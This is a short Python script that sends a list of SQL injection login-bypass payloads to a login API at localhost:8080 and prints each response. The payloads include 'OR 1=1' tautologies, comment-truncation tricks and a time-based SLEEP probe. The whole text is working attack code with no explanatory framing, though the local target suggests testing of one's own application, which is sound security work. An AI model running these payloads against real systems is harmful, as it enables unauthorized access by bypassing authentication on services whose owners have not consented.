import requests

URL = "https://localhost:8080/api/users/login/psw"

payloads = [
    "admin' OR '1'='1",
    "admin' OR '1'='1' --",
    "admin' OR '1'='1' /*",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "admin'--",
    "admin'#",
    "admin'/*",
    "admin' OR TRUE --",
    "admin' OR 1=1 --",
    "admin\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1",
    "admin' OR SLEEP(2) --"
]

for i, inj in enumerate(payloads, start=1):
    data = {
        "username": inj,
        "password": "password!"
    }

    try:
        response = requests.post(
            URL,
            json=data,
            verify=False,
            timeout=5
        )

        print(f"[{i}] Payload: {inj}")
        print(f"    Status: {response.status_code}")
        print(f"    Response: {response.text[:100]}\n")

    except Exception as e:
        print(f"[{i}] Payload: {inj}")
        print(f"    ERROR: {e}\n")
